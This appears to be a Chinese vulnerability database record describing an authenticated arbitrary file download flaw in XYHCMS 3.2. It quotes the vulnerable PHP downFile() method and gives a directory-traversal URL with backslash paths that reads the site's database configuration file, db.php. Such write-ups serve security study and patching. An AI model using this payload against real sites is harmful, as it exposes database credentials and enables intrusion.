---
source: "hatch 补库批 20260928"
product: "XYHCMS3.2"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "XYHCMS 3.2 后台任意文件下载"
prerequisites: "来源所述条件，未列明部分仍待核：backendDatabasepermission; Windowsbackslashpaths; readabledbconfig"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-f9f142fca46733d966568163"
entity_id: "ve-f9f142fca46733d966568163"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：backendDatabasepermission; Windowsbackslashpaths; readabledbconfig

- **适用与权限边界（1）**：简介没有任何限制不精确，代码校type zip/sql与存在性但缺目录边界。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **结论使用边界（2）**：PoC使用反斜线依Windows/PHP文件系统，Linux需不同路径形态。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（3）**：完整函数/后台前提清楚，但无响应/原始来源/修复。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# XYHCMS 3.2 后台任意文件下载

一、漏洞简介
------------

没有对下载的文件做任何限制

二、漏洞影响
------------

XYHCMS 3.2

三、复现过程
------------

### 漏洞分析

`/App/Manage/Controller/DatabaseController.class.php`的downfile()方法

    public function downFile() {  
        if (empty($_GET['file']) || empty($_GET['type']) || !in_array($_GET['type'], array("zip", "sql"))) {  
            $this->error("下载地址不存在");  
        }  
        $path     = array("zip" => $this->getDbPath() . "Zip/", "sql" => $this->getDbPath() . '/');  
        $filePath = $path[$_GET['type']] . $_GET['file'];  
        if (!file_exists($filePath)) {  
            $this->error("该文件不存在，可能是被删除");  
        }  
         $filename = basename($filePath);  
         header("Content-type: application/octet-stream");  
         header('Content-Disposition: attachment; filename="' . $filename . '"');  
         header("Content-Length: " . filesize($filePath));  
         readfile($filePath);  
     }

### 漏洞复现

1.  登录后台
2.  访问`http://www.0-sec.org/xyhai.php?s=/Database/downFile/file/..\\..\\..\\App\\Common\\Conf\\db.php/type/zip`
3.  下载到数据库配置文件
